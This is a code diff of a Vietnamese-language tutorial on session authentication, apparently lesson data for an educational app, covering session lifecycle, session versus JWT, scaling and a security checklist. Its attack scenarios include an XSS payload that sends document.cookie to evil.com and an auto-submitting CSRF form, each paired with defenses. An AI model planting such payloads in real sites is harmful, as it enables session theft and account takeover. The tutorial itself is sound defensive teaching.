+        'Redis: Nhanh + Persistent + Scalable - industry standard cho production',
+        'Bắt đầu đơn giản (Database), scale sau (Redis)',
+        'Netflix, Facebook, Twitter đều dùng Redis cho sessions'
       ],
-      visual: 'Comparison table: Storage Type | Speed | Persistence | Scaling | Use Case',
+      visual: 'Bảng so sánh: In-Memory vs Database vs Redis',
     },
     {
       id: 'section-5',
-      category: 'important',
-      title: 'Session Lifecycle: Birth to Termination',
+      category: 'concepts',
+      title: 'Vòng Đời Session: Từ Sinh Ra Đến Chết Đi',
       icon: 'RefreshCw',
-      content: `Sessions have four lifecycle stages: Creation, Refresh, Regeneration, and Destruction.
-Mastering these stages is critical for security and user experience.
+      content: `### 📱 Ví Dụ: Một Ngày Với Facebook
 
-**Creation**: On successful login, generate a cryptographically random ID, store session data, set cookie.
-Never reuse old session IDs - always create fresh ones.
+**7:00 AM - Đăng nhập (Creation)**
+- Bạn mở Facebook, nhập email + password
+- Facebook tạo session mới: \`session_abc123\`
+- Gửi cookie về browser, hết hạn lúc 7:00 PM (12 giờ)
 
-**Refresh**: Extend session expiration on user activity (sliding expiration). User actively browsing?
-Don't force re-login every 30 minutes. Update lastActivity timestamp and push expiration forward.
+**12:00 PM - Đang dùng (Refresh)**
+- Bạn vẫn đang lướt Facebook, like ảnh, comment
+- Facebook thấy bạn active → Gia hạn thêm 12 giờ
+- Session giờ hết hạn lúc 12:00 AM (nửa đêm)
 
-**Regeneration**: CRITICAL security step - after privilege changes (login, role upgrade), regenerate
-the session ID while preserving data. Prevents session fixation attacks where attackers set your ID.
+**3:00 PM - Nâng cấp quyền (Regeneration)**
+- Bạn vào Settings → Đổi password
+- Facebook TẠO SESSION MỚI: \`session_xyz789\`
+- XÓA session cũ \`session_abc123\`
+- Lý do: Bảo mật! (giải thích bên dưới)
 
-**Destruction**: On logout or expiration, delete session from storage and clear cookie. Incomplete
-logout is a security vulnerability - always clean up both server and client state.`,
+**10:00 PM - Đăng xuất (Destruction)**
+- Bạn click "Logout"
+- Facebook XÓA session khỏi database
+- Facebook XÓA cookie khỏi browser
+- Bạn phải đăng nhập lại
+
+### 🔄 4 Giai Đoạn Vòng Đời
+
+#### 1. **Creation (Tạo Session)**
+
+**Khi nào**: User đăng nhập thành công
+
+**Điều gì xảy ra**:
+\`\`\`javascript
+// 1. Tạo ID ngẫu nhiên
+const sessionId = crypto.randomBytes(32).toString('hex');
+// → "a7f3b9d2e8c1f4a6b3d9e7c2f8a1b4d6..."
+
+// 2. Lưu vào database
+await db.sessions.create({
+  id: sessionId,
+  userId: user.id,
+  createdAt: new Date(),
+  expiresAt: new Date(Date.now() + 12*60*60*1000), // 12 giờ
+  lastActivity: new Date()
+});
+
+// 3. Gửi cookie
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,
+  secure: true,
+  maxAge: 12*60*60*1000
+});
+\`\`\`
+
+**Quy tắc vàng**: KHÔNG BAO GIỜ tái sử dụng session ID cũ!
+
+---
+
+#### 2. **Refresh (Gia Hạn Session)**
+
+**Khi nào**: User đang active (click, scroll, type)
+
+**Vấn đề**:
+- Session hết hạn sau 30 phút
+- User đang xem video dài 1 giờ
+- Phút thứ 31 → Bị logout giữa chừng!
+
+**Giải pháp - Sliding Expiration**:
+\`\`\`javascript
+// Middleware: Mỗi request → Gia hạn session
+async function refreshSession(req, res, next) {
+  const session = await db.sessions.findById(req.cookies.sessionId);
+
+  if (session) {
+    // Cập nhật lastActivity
+    session.lastActivity = new Date();
+
+    // Gia hạn thêm 30 phút
+    session.expiresAt = new Date(Date.now() + 30*60*1000);
+
+    await session.save();
+  }
+
+  next();
+}
+
+app.use(refreshSession);
+\`\`\`
+
+**Kết quả**:
+- User active → Session tự động gia hạn
+- User không active 30 phút → Logout (bảo mật)
+- User xem video 2 giờ → Vẫn đăng nhập ✓
+
+**Ví dụ thực tế**:
+- **Gmail**: Gia hạn mỗi lần bạn đọc email
+- **Netflix**: Gia hạn mỗi 5 phút khi xem phim
+- **Ngân hàng**: KHÔNG gia hạn - timeout cứng 15 phút (bảo mật)
+
+---
+
+#### 3. **Regeneration (Tạo Lại Session ID)**
+
+**Khi nào**: Sau khi thay đổi quyền/privilege
+
+**Tình huống**:
+1. User đăng nhập → Session: \`abc123\`
+2. User đổi password
+3. User nâng cấp lên admin
+4. User enable 2FA
+
+→ TẠO SESSION MỚI, XÓA SESSION CŨ!
+
+**Tại sao quan trọng? Session Fixation Attack!**
+
+**Kịch bản tấn công**:
+\`\`\`
+1. Hacker tạo session: session_HACKER_KNOWS
+2. Hacker gửi link cho bạn:
+   https://bank.com/login?sessionId=session_HACKER_KNOWS
+3. Bạn click link, đăng nhập thành công
+4. NẾU server KHÔNG regenerate session:
+   → Bạn dùng session_HACKER_KNOWS
+   → Hacker BIẾT session ID này
+   → Hacker dùng session_HACKER_KNOWS để đăng nhập
+   → Hacker vào được tài khoản của bạn!
+\`\`\`
+
+**Cách phòng chống**:
+\`\`\`javascript
+app.post('/login', async (req, res) => {
+  const user = await verifyCredentials(req.body);
+
+  // XÓA session cũ (nếu có)
+  const oldSessionId = req.cookies.sessionId;
+  if (oldSessionId) {
+    await db.sessions.delete(oldSessionId);
+  }
+
+  // TẠO SESSION MỚI (random mới hoàn toàn)
+  const newSessionId = crypto.randomBytes(32).toString('hex');
+
+  await db.sessions.create({
+    id: newSessionId,
+    userId: user.id,
+    expiresAt: new Date(Date.now() + 12*60*60*1000)
+  });
+
+  res.cookie('sessionId', newSessionId, { /* ... */ });
+
+  res.json({ success: true });
+});
+\`\`\`
+
+**Kết quả**:
+- Hacker biết session cũ → Vô dụng (đã bị xóa)
+- Bạn dùng session mới → Hacker KHÔNG biết
+- Tài khoản an toàn ✓
+
+---
+
+#### 4. **Destruction (Hủy Session)**
+
+**Khi nào**:
+- User click "Logout"
+- Session hết hạn (timeout)
+- Admin force logout
+
+**Điều gì xảy ra**:
+\`\`\`javascript
+app.post('/logout', async (req, res) => {
+  const sessionId = req.cookies.sessionId;
+
+  // 1. XÓA khỏi database
+  await db.sessions.delete(sessionId);
+
+  // 2. XÓA cookie khỏi browser
+  res.clearCookie('sessionId');
+
+  res.json({ success: true, message: 'Đã đăng xuất' });
+});
+\`\`\`
+
+**LỖI THƯỜNG GẶP - Logout không hoàn toàn**:
+\`\`\`javascript
+// ❌ SAI - Chỉ xóa cookie, không xóa database
+app.post('/logout', (req, res) => {
+  res.clearCookie('sessionId');
+  res.json({ success: true });
+});
+
+// Vấn đề: Session vẫn còn trong database
+// Nếu hacker có session ID → Vẫn dùng được!
+\`\`\`
+
+**✅ ĐÚNG - Xóa cả 2 nơi**:
+\`\`\`javascript
+app.post('/logout', async (req, res) => {
+  // 1. Xóa database
+  await db.sessions.delete(req.cookies.sessionId);
+
+  // 2. Xóa cookie
+  res.clearCookie('sessionId');
+
+  res.json({ success: true });
+});
+\`\`\`
+
+### 📊 Timeline Ví Dụ
+
+\`\`\`
+7:00 AM  │ LOGIN → Creation
+         │ Session: abc123, expires: 7:00 PM
+         │
+9:00 AM  │ Like ảnh → Refresh
+         │ Session: abc123, expires: 9:00 PM (gia hạn)
+         │
+12:00 PM │ Comment → Refresh
+         │ Session: abc123, expires: 12:00 AM
+         │
+3:00 PM  │ Đổi password → Regeneration
+         │ Session CŨ: abc123 → XÓA
+         │ Session MỚI: xyz789, expires: 3:00 AM
+         │
+10:00 PM │ LOGOUT → Destruction
+         │ Session: xyz789 → XÓA
+         │ Cookie → XÓA
+         │ Phải đăng nhập lại
+\`\`\`
+
+### 🎯 Best Practices
+
+**1. Luôn regenerate sau login**
+\`\`\`javascript
+// Sau khi verify credentials thành công
+const newSessionId = crypto.randomBytes(32).toString('hex');
+\`\`\`
+
+**2. Sliding expiration cho UX tốt**
+\`\`\`javascript
+// Mỗi request → Gia hạn thêm 30 phút
+session.expiresAt = new Date(Date.now() + 30*60*1000);
+\`\`\`
+
+**3. Logout phải xóa cả 2 nơi**
+\`\`\`javascript
+await db.sessions.delete(sessionId);  // Database
+res.clearCookie('sessionId');         // Browser
+\`\`\`
+
+**4. Auto-cleanup sessions hết hạn**
+\`\`\`javascript
+// Chạy mỗi giờ
+setInterval(async () => {
+  await db.sessions.deleteMany({
+    expiresAt: { $lt: new Date() }
+  });
+}, 60*60*1000);
+\`\`\``,
       keyPoints: [
-        'Creation: Fresh random ID + store data + set cookie',
-        'Refresh: Sliding expiration extends on activity',
-        'Regeneration: New ID after login/privilege change (security!)',
-        'Destruction: Delete server data + clear client cookie',
-        'Never reuse session IDs - always generate new ones'
+        'Creation: Tạo session mới khi đăng nhập - KHÔNG tái sử dụng ID cũ',
+        'Refresh: Gia hạn session khi user active - Sliding expiration',
+        'Regeneration: Tạo session mới sau đổi password/quyền - Chặn session fixation',
+        'Destruction: Xóa CẢ database VÀ cookie khi logout',
+        'Regeneration là bước BẮT BUỘC để chống session fixation attack'
       ],
-      visual: 'Timeline diagram showing session states over time',
+      visual: 'Timeline: 7AM (Login) → 9AM (Refresh) → 3PM (Regenerate) → 10PM (Logout)',
       codeExamples: {
         javascript: `// Session Regeneration (prevents fixation attacks)
 app.post('/login', async (req, res) => {
@@ -358,192 +1240,468 @@ end`
     },
     {
       id: 'section-6',
-      category: 'important',
-      title: 'Session vs JWT: Choosing Your Protocol',
+      category: 'concepts',
+      title: 'Session vs JWT: Chọn Cái Nào?',
       icon: 'GitCompare',
-      content: `In 2084's megacity, choosing between Session and JWT is like choosing between a keycard
-and a digital passport. Both grant access, but they work fundamentally differently.
+      content: `### 🤔 Tình Huống: Website vs Mobile App
 
-**Session**: Server maintains state. Every request requires database lookup. Instant revocation (delete
-session = user logged out). Perfect for traditional web apps where server control is critical.
+**Dự án 1: Admin Dashboard (Website)**
+- Quản lý nhân sự, chỉ dùng trên browser
+- Cần logout ngay khi rời công ty
+- Bảo mật cao (dữ liệu nhạy cảm)
+→ Dùng **SESSION**
 
-**JWT**: Stateless tokens. No database lookup needed. Can't revoke until expiration. Perfect for mobile
-apps, microservices, and scenarios where horizontal scaling matters more than instant control.
+**Dự án 2: App Giao Đồ Ăn (Mobile)**
+- iOS/Android app
+- Nhiều microservices (order, payment, delivery)
+- Cần scale nhanh (hàng triệu users)
+→ Dùng **JWT**
 
-When to choose **Session**:
-- Traditional server-rendered web applications
-- Need instant logout/revocation capability
-- Strong security requirements (banking, healthcare)
-- Single application (not distributed microservices)
+### ⚖️ So Sánh
 
-When to choose **JWT**:
-- Mobile applications (avoid server round-trips)
-- Microservices architecture (no shared session store)
-- Horizontal scaling priority
-- API-first design (REST/GraphQL)`,
+| Tiêu Chí | Session | JWT |
+|----------|---------|-----|
+| **Lưu trữ** | Server (DB/Redis) | Client |
+| **Logout** | Ngay lập tức ✓ | Đợi expire ⚠️ |
+| **Mobile** | Cookie không tốt | Hoàn hảo ✓ |
+| **Scale** | Cần Redis cluster | Dễ (stateless) ✓ |
+| **Bảo mật** | Server kiểm soát ✓ | Client giữ token ⚠️ |
+
+### ✅ Khi Nào Dùng Session?
+
+1. **Website truyền thống**: Facebook web, Gmail web, Admin panel
+2. **Cần logout ngay**: Ngân hàng, Healthcare
+3. **Bảo mật ưu tiên**: Dữ liệu nhạy cảm
+4. **Single app**: Không phải microservices
+
+### ✅ Khi Nào Dùng JWT?
+
+1. **Mobile app**: Shopee, Grab (cookie không hoạt động)
+2. **Microservices**: Mỗi service verify độc lập
+3. **API-first**: RESTful API, GraphQL
+4. **Scale lớn**: Hàng triệu users, stateless
+
+### 🔄 Hybrid (Kết Hợp)
+
+**Facebook**:
+- Web → Session
+- Mobile → JWT
+- API → OAuth
+
+**Quyết định nhanh**:
+- Mới học? → **Session** (đơn giản)
+- Mobile app? → **JWT** (bắt buộc)
+- Cần bảo mật cao? → **Session**
+- Cần scale lớn? → **JWT**`,
       keyPoints: [
-        'Session: Stateful, instant revocation, database lookup required',
-        'JWT: Stateless, no revocation, no database lookup needed',
-        'Session better for: Web apps, strict security, instant logout',
-        'JWT better for: Mobile apps, microservices, scaling',
-        'Hybrid approach possible: Use both for different purposes'
+        'Session: Web app, logout ngay, bảo mật cao',
+        'JWT: Mobile app, microservices, scale lớn',
+        'Hybrid: Web dùng Session, Mobile dùng JWT',
+        'Mới học → Session, Mobile → JWT',
+        'Facebook, Google đều dùng cả hai'
       ],
-      visual: 'Side-by-side comparison table with checkmarks/crosses',
+      visual: 'Decision tree: Web vs Mobile → Session vs JWT',
     },
 
     // ADVANCED SECTIONS
     {
       id: 'section-7',
-      category: 'advanced',
-      title: 'Security Breach Scenarios',
+      category: 'security',
+      title: 'Kịch Bản Tấn Công Thực Tế',
       icon: 'AlertTriangle',
-      content: `In 2084's digital warfare landscape, three session attacks dominate the threat matrix.
-Understanding these attacks - and their defenses - separates amateur coders from security guardians.
+      content: `### ⚠️ 3 Cuộc Tấn Công Phổ Biến Nhất
 
-These aren't theoretical vulnerabilities. They're exploited daily against real applications. Companies
-lose millions because developers skip HTTP-Only flags or forget session regeneration. Don't be that developer.
+Đây KHÔNG phải lý thuyết. Đây là các cuộc tấn công xảy ra HÀNG NGÀY trên internet.
 
-Each scenario below shows the attack flow, what the hacker gains, and how to defend. Study them.
-Practice them. Make these defenses automatic in your code.`,
+Các công ty mất hàng triệu đô vì developers:
+- Quên set HttpOnly flag
+- Không regenerate session sau login
+- Logout không xóa session khỏi database
+
+Hãy học các kịch bản này. Hiểu rõ cách tấn công. Biết cách phòng thủ.
+
+---
+
+### 🎯 Attack #1: Session Hijacking qua XSS
+
+**Mục tiêu**: Đánh cắp session cookie
+
+**Kịch bản**:
+
+1. **Hacker inject script độc**:
+   - Website có lỗ hổng XSS (không validate input)
+   - Hacker post comment: \`<script>fetch('https://evil.com?c='+document.cookie)</script>\`
+
+2. **Nạn nhân xem comment**:
+   - Script chạy trong browser của nạn nhân
+   - \`document.cookie\` đọc được session cookie
+   - Gửi về server của hacker
+
+3. **Hacker dùng cookie**:
+   - Hacker set cookie vào browser của họ
+   - Truy cập website
+   - Server thấy cookie hợp lệ → Cho phép truy cập
+   - Hacker đăng nhập thành công!
+
+**Thiệt hại**:
+- Hacker đọc tin nhắn riêng tư
+- Hacker post bài, gửi tin nhắn giả mạo
+- Hacker đổi password, chiếm tài khoản
+
+**Phòng thủ**:
+\`\`\`javascript
+// ✅ Set HttpOnly flag
+res.cookie('sessionId', sessionId, {
+  httpOnly: true  // JavaScript KHÔNG đọc được!
+});
+
+// Kết quả:
+// document.cookie → "" (rỗng)
+// Hacker không lấy được cookie ✓
+\`\`\`
+
+**Thêm lớp bảo vệ**:
+\`\`\`javascript
+// Content Security Policy
+app.use((req, res, next) => {
+  res.setHeader(
+    'Content-Security-Policy',
+    "script-src 'self'"  // Chỉ cho phép script từ domain này
+  );
+  next();
+});
+\`\`\`
+
+---
+
+### 🎯 Attack #2: Session Fixation
+
+**Mục tiêu**: Cài session ID trước khi nạn nhân login
+
+**Kịch bản**:
+
+1. **Hacker tạo session**:
+   - Hacker tạo session: \`HACKER_SESSION_123\`
+   - Hacker biết ID này
+
+2. **Hacker gửi link cho nạn nhân**:
+   - Email: "Click để nhận quà: bank.com/login?sid=HACKER_SESSION_123"
+   - Nạn nhân click link
+
+3. **Nạn nhân đăng nhập**:
+   - Nạn nhân nhập username + password
+   - Server XÁC THỰC thành công
+   - NẾU server KHÔNG regenerate session:
+     → Server dùng \`HACKER_SESSION_123\` làm session
+
+4. **Hacker chiếm tài khoản**:
+   - Hacker dùng \`HACKER_SESSION_123\` (họ biết từ đầu)
+   - Truy cập website
+   - Đăng nhập thành công!
+
+**Thiệt hại**:
+- Hacker vào được tài khoản ngân hàng
+- Chuyển tiền, đọc thông tin nhạy cảm
+
+**Phòng thủ**:
+\`\`\`javascript
+// ✅ LUÔN LUÔN regenerate session sau login
+app.post('/login', async (req, res) => {
+  const user = await verifyCredentials(req.body);
+
+  // XÓA session cũ (nếu có)
+  if (req.cookies.sessionId) {
+    await db.sessions.delete(req.cookies.sessionId);
+  }
+
+  // TẠO SESSION MỚI (random hoàn toàn)
+  const newSessionId = crypto.randomBytes(32).toString('hex');
+
+  await db.sessions.create({
+    id: newSessionId,
+    userId: user.id
+  });
+
+  res.cookie('sessionId', newSessionId, { /* ... */ });
+  res.json({ success: true });
+});
+
+// Kết quả:
+// - Hacker biết HACKER_SESSION_123 → Đã bị xóa
+// - User dùng session mới → Hacker KHÔNG biết ✓
+\`\`\`
+
+---
+
+### 🎯 Attack #3: CSRF (Cross-Site Request Forgery)
+
+**Mục tiêu**: Gửi request giả mạo kèm cookie của nạn nhân
+
+**Kịch bản**:
+
+1. **Nạn nhân đăng nhập ngân hàng**:
+   - User login vào bank.com
+   - Session cookie được lưu
+
+2. **Hacker tạo website độc hại**:
+   \`\`\`html
+   <!-- evil.com -->
+   <form action="https://bank.com/transfer" method="POST">
+     <input name="to" value="hacker_account" />
+     <input name="amount" value="1000000" />
+   </form>
+   <script>
+     document.forms[0].submit();  // Tự động submit
+   </script>
+   \`\`\`
+
+3. **Nạn nhân truy cập evil.com**:
+   - Click link lạ, vào evil.com
+   - Form tự động submit đến bank.com
+   - Browser TỰ ĐỘNG gửi cookie bank.com kèm theo
+
+4. **Ngân hàng xử lý request**:
+   - NẾU không có SameSite:
+     → Cookie được gửi
+     → Bank.com thấy session hợp lệ
+     → Chuyển tiền thành công!
+
+**Thiệt hại**:
+- Mất tiền trong tài khoản
+- Thay đổi thông tin cá nhân
+- Post bài, gửi tin nhắn giả mạo
+
+**Phòng thủ**:
+\`\`\`javascript
+// ✅ Set SameSite=Strict
+res.cookie('sessionId', sessionId, {
+  sameSite: 'strict'  // Cookie CHỈ gửi từ cùng domain
+});
+
+// Kết quả:
+// - Request từ evil.com → Cookie KHÔNG được gửi
+// - Request từ bank.com → Cookie được gửi ✓
+\`\`\`
+
+**Thêm CSRF token**:
+\`\`\`javascript
+// Generate CSRF token
+app.get('/transfer-form', (req, res) => {
+  const csrfToken = crypto.randomBytes(32).toString('hex');
+  req.session.csrfToken = csrfToken;
+
+  res.render('transfer', { csrfToken });
+});
+
+// Verify CSRF token
+app.post('/transfer', (req, res) => {
+  if (req.body.csrfToken !== req.session.csrfToken) {
+    return res.status(403).json({ error: 'Invalid CSRF token' });
+  }
+
+  // Process transfer...
+});
+\`\`\`
+
+### 📊 Tóm Tắt
+
+| Attack | Cách Tấn Công | Phòng Thủ |
+|--------|---------------|----------|
+| **XSS Hijacking** | Script đọc \`document.cookie\` | \`httpOnly: true\` |
+| **Session Fixation** | Cài session ID trước login | Regenerate sau login |
+| **CSRF** | Website khác gửi request | \`sameSite: 'strict'\` + CSRF token |
+
+### ✅ Checklist Bảo Mật
+
+\`\`\`javascript
+// Code mẫu AN TOÀN
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,        // ✅ Chặn XSS
+  secure: true,          // ✅ Chỉ HTTPS
+  sameSite: 'strict',    // ✅ Chặn CSRF
+  maxAge: 30*60*1000     // ✅ Timeout 30 phút
+});
+
+// + Regenerate sau login  // ✅ Chặn Fixation
+// + Logout xóa database   // ✅ Cleanup hoàn toàn
+// + CSRF token cho forms  // ✅ Defense-in-depth
+\`\`\``,
       keyPoints: [
-        'Session Hijacking: Stolen cookies grant full account access',
-        'Session Fixation: Attacker sets your session ID before login',
-        'CSRF Attacks: Malicious sites make requests using your session',
-        'All three are preventable with proper cookie configuration',
-        'Defense-in-depth: Multiple layers of protection'
+        'XSS: Hacker cướp cookie bằng JavaScript → Dùng HttpOnly để chặn',
+        'Session Fixation: Hacker cài ID trước → Dùng Regeneration để chặn',
+        'CSRF: Hacker lừa browser gửi request → Dùng SameSite để chặn',
+        'Luôn dùng HTTPS (Secure flag) để chống nghe lén',
+        'Bảo mật là sự kết hợp nhiều lớp (Defense in Depth)'
       ],
       visual: 'Three security scenario cards (handled by SecurityScenario component)',
     },
     {
       id: 'section-8',
       category: 'advanced',
-      title: 'Scaling to Millions: Enterprise Patterns',
+      title: 'Scaling: Khi Có 1 Triệu Users',
       icon: 'TrendingUp',
-      content: `When NeoTech Tower scales from 1,000 to 1,000,000 concurrent users, session architecture
-must evolve. Here's how enterprise applications handle massive scale.
+      content: `### 📈 Vấn Đề Của Session
+Khi app của bạn phát triển từ 100 users lên 1 triệu users, session bắt đầu gặp vấn đề lớn:
 
-**Sticky Sessions (Load Balancer)**: Route users to same server based on session ID. Simplest approach
-but creates "hot spots" - one server might get overloaded while others idle. Not recommended for 2084.
+**Kịch bản**:
+- Bạn có 1 triệu users → Cần 50 servers chạy song song
+- User A login vào Server 1 → Session lưu ở RAM Server 1
+- User A gửi request tiếp theo → Load Balancer chuyển sang Server 2
+- Server 2 kiểm tra RAM → Không thấy session đâu cả!
+- User A bị logout ❌
 
-**Centralized Session Store (Redis Cluster)**: All servers share a Redis cluster for session storage.
-Any server can validate any session. This is the industry standard. Scales horizontally, handles failures.
+### 🛠️ Giải Pháp Scaling
 
-**Session Replication**: Each server maintains session data, replicates to peers. High redundancy but
-complex synchronization. Used by banks and mission-critical systems.
+#### 1. Sticky Sessions (Dễ nhất)
+Load Balancer nhớ: "User A luôn forward về Server 1".
 
-**Stateless Alternative (JWT)**: Eliminate sessions entirely. Trade server control for scalability.
-Popular for microservices where session storage becomes a bottleneck.`,
+- ✅ **Ưu điểm**: Dễ setup, không cần code thêm
+- ❌ **Nhược điểm**: Server 1 quá tải thì User A chết chung. Không linh hoạt.
+
+#### 2. Redis Cluster (Chuẩn mực)
+Tất cả 50 servers đều kết nối vào một cụm server Redis chung.
+
+- Server 1 tạo session → Lưu vào Redis
+- Server 2 nhận request → Đọc từ Redis
+- ✅ **Ưu điểm**: Nhanh, persistent, server nào chết cũng không sao
+- ❌ **Nhược điểm**: Tốn tiền nuôi Redis cluster
+
+#### 3. JWT (Stateless)
+Bỏ session luôn! Dùng JWT để không cần lưu gì ở server.
+
+- ✅ **Ưu điểm**: Scale vô cực, không tốn RAM/Redis
+- ❌ **Nhược điểm**: Mất khả năng logout ngay lập tức
+
+### 🏢 Thực Tế Các Ông Lớn Làm Gì?
+
+- **Facebook/Netflix**: Dùng **Redis Cluster** khổng lồ để lưu sessions. Họ cần kiểm soát user (logout, block) nên chấp nhận tốn tiền.
+- **Google/Shopee**: Dùng JWT cho mobile app, Session cho web.
+- **Startup**: Bắt đầu với 1 database server (Postgres/MySQL) lưu session. Khi nào chậm thì chuyển sang Redis.
+
+**Lời khuyên**:
+Đừng lo về scaling khi mới có 100 users. Hãy dùng Database session. Khi nào có 10k users, chuyển sang Redis. Dễ mà!`,
       keyPoints: [
-        'Sticky sessions: Simple but creates hotspots, not recommended',
-        'Redis cluster: Industry standard, horizontal scaling, high availability',
-        'Session replication: Maximum redundancy, complex setup',
-        'JWT migration: Trade control for scalability',
-        'Netflix, Twitter, GitHub all use Redis for session storage'
+        'Vấn đề: Nhiều servers không share RAM với nhau',
+        'Giải pháp 1: Sticky Session - User gắn chặt với 1 server',
+        'Giải pháp 2: Redis Cluster - "Kho session" chung cho tất cả (Best choice)',
+        'Giải pháp 3: JWT - Không lưu gì cả (Stateless)',
+        'Đừng over-engineer: 10k users hãy nghĩ đến Redis'
       ],
-      visual: 'Architecture diagram showing load balancer → multiple servers → Redis cluster',
+      visual: 'Architecture diagram: Load Balancer → 3 Server → Common Redis',
     },
     {
       id: 'section-9',
-      category: 'advanced',
-      title: "The Guardian's Checklist: Best Practices",
+      category: 'best_practices',
+      title: 'Checklist Cho Developer Chuyên Nghiệp',
       icon: 'CheckCircle',
-      content: `You've mastered the theory. Now lock it down with these battle-tested best practices
-from 2084's top security teams.
+      content: `### 🛡️ Những Thứ Cần Làm NGAY HÔM NAY
 
-**Short Expiration**: 15-30 minute idle timeout for sensitive apps (banking, admin). 1-2 hours for
-casual apps (social media). Shorter = more secure but worse UX. Find the balance for your use case.
+Đừng chờ bị hack mới sửa. Hãy check lại code của bạn ngay bây giờ:
 
-**Regenerate on Privilege Change**: User logs in? New session ID. User upgrades to admin? New session ID.
-Any privilege change = regenerate. Prevents fixation and elevation attacks.
+#### 1. Cấu hình Cookie
+- [ ] **HttpOnly**: Bắt buộc (Chặn XSS)
+- [ ] **Secure**: Bắt buộc (Chặn nghe lén, chỉ chạy HTTPS)
+- [ ] **SameSite**: Strict hoặc Lax (Chặn CSRF)
+- [ ] **MaxAge**: Đừng để quá dài (15-30p cho bank, 1 tuân cho Facebook)
 
-**Monitor Active Sessions**: Show users "Your active sessions" page. Let them revoke specific devices.
-Detect anomalies (IP changes, unusual activity). Netflix does this beautifully.
+#### 2. Logic Session
+- [ ] **Regenerate ID**: Sau khi login phải tạo ID mới (Chống Fixation)
+- [ ] **Logout**: Xóa cả DB lẫn Cookie (Chống dùng lại)
+- [ ] **Random ID**: Dùng thư viện crypto, đừng dùng Math.random()
 
-**Secure "Remember Me"**: Never extend session timeout to weeks/months. Instead: issue a separate
-long-lived token (stored securely) that can create new sessions. Revocable separately from sessions.
+#### 3. UX (Trải nghiệm người dùng)
+- [ ] **Sliding Expiration**: User đang dùng thì tự động gia hạn
+- [ ] **Active Sessions**: Cho user xem danh sách thiết bị đang đăng nhập (như Facebook)
+- [ ] **Force Logout**: Cho phép user đá thiết bị lạ ra ngoài
 
-**Audit Logging**: Log every session creation, validation failure, and logout. When breach happens
-(not if), you'll need forensics. Timestamp, IP, user agent, session ID (first 10 chars only).`,
+#### 4. Monitoring (Giám sát)
+- [ ] **Log login**: Lưu lại ai đăng nhập, IP nào, giờ nào
+- [ ] **Log failures**: Ai đăng nhập sai quá 5 lần? → Block IP
+- [ ] **Alert**: Cảnh báo khi có hoạt động bất thường (Login từ nước lạ)
+
+### 🎓 Lời Kết
+Session Authentication là nền tảng của bảo mật web. Nó cũ nhưng không lỗi thời.
+Hiểu sâu về nó, bạn sẽ tự tin xây dựng hệ thống an toàn cho hàng triệu người dùng.
+
+Chúc bạn code an toàn! 🚀`,
       keyPoints: [
-        'Short timeouts: 15-30 min sensitive, 1-2 hours casual',
-        'Regenerate ID on privilege changes (login, role upgrade)',
-        'Let users monitor and revoke active sessions',
-        '"Remember me" = separate token, not extended session',
-        'Comprehensive audit logging for forensics'
+        'Cookie: HttpOnly + Secure + SameSite là bắt buộc',
+        'Logic: Luôn regenerate ID sau khi login',
+        'UX: Làm tính năng "Active Sessions" cho user quản lý',
+        'Monitoring: Log mọi hành vi đăng nhập/đăng xuất',
+        'Bảo mật là một quá trình, không phải tính năng'
       ],
-      visual: 'Checklist with code examples for each practice',
-    },
+      visual: 'Interactive Checklist UI with progress bar',
+    }
   ],
 
   securityScenarios: [
     {
       id: 'scenario-1',
-      name: 'The Cookie Thief: XSS Session Hijacking',
+      name: 'Kẻ Cắp Cookie: XSS Attack',
       threatLevel: 'HIGH',
-      attack: `A hacker injects malicious JavaScript into your web app via an unvalidated comment field.
-The script executes: \`<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\`.
-If HTTP-Only is FALSE, the attacker receives your session cookie instantly.`,
-      exploitation: `The attacker now has your session ID. They set it in their browser and refresh the page.
-The server sees a valid session cookie, validates it, and grants full access. The attacker is now logged
-in as YOU - with all your permissions, data access, and account control.`,
-      defense: `Set HTTP-Only=true on cookies. This flag makes cookies inaccessible to JavaScript -
-document.cookie returns empty. The XSS attack still happens, but it can't steal sessions. Additionally,
-use Content Security Policy (CSP) headers to prevent inline scripts altogether.`,
-      interactive: 'Try to steal a cookie with/without HTTP-Only flag using browser console'
+      attack: `Hacker chèn mã JavaScript độc hại vào web của bạn qua tính năng bình luận.
+Script chạy: \`<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\`.
+Nếu cookie KHÔNG có HttpOnly, hacker sẽ nhận được session ID ngay lập tức.`,
+      exploitation: `Hacker giờ đã có session ID của bạn. Hắn set cookie vào browser của hắn và refresh trang.
+Server thấy cookie hợp lệ → Hacker đăng nhập thành công vào tài khoản CỦA BẠN!`,
+      defense: `BẬT HttpOnly=true cho cookies. Cờ này chặn JavaScript đọc cookie - document.cookie sẽ trả về rỗng.
+XSS vẫn xảy ra, nhưng cookie an toàn. Ngoài ra, dùng Content Security Policy (CSP) để chặn script lạ.`,
+      interactive: 'Thử đánh cắp cookie có và không có HttpOnly flag'
     },
     {
       id: 'scenario-2',
-      name: 'The Session Fixer: ID Fixation Attack',
+      name: 'Kẻ Cài Cắm: Session Fixation',
       threatLevel: 'MEDIUM',
-      attack: `An attacker sends you a link: \`neotech.com/login?sessionId=HACKER_CONTROLLED\`.
-You click it and log in successfully. The server, if poorly coded, accepts the session ID from the URL
-and uses it for your authenticated session.`,
-      exploitation: `The attacker already knows the session ID (they generated it). They don't need to
-steal anything - they SET it beforehand. After you log in, they simply use that same session ID to access
-your account. You did the work of logging in FOR them.`,
-      defense: `ALWAYS regenerate session ID after successful login. Never accept client-provided session IDs.
-The server must generate a fresh, cryptographically random ID and invalidate any existing session. This
-simple step makes fixation attacks impossible.`,
-      interactive: 'View code comparison: vulnerable vs secure session creation'
+      attack: `Hacker gửi link cho bạn: \`bank.com/login?sessionId=HACKER_CONTROLLED\`.
+Bạn click và đăng nhập thành công. Server (code dở) chấp nhận session ID từ URL và dùng nó cho bạn.`,
+      exploitation: `Hacker đã biết trước session ID (hắn tự tạo mà). Sau khi bạn đăng nhập, hắn dùng ID đó
+để vào tài khoản của bạn. Bạn đã "mở cửa" mời hắn vào nhà.`,
+      defense: `LUÔN LUÔN tạo session ID mới sau khi login. Không bao giờ chấp nhận ID từ client gửi lên.
+Server phải tự tạo ID ngẫu nhiên. Bước đơn giản này chặn đứng Fixation attack.`,
+      interactive: 'So sánh code: Bị lỗi vs An toàn'
     },
     {
       id: 'scenario-3',
-      name: 'The Forgotten Logout: Shared Computer Risk',
+      name: 'Quên Logout: Rủi Ro Máy Công Cộng',
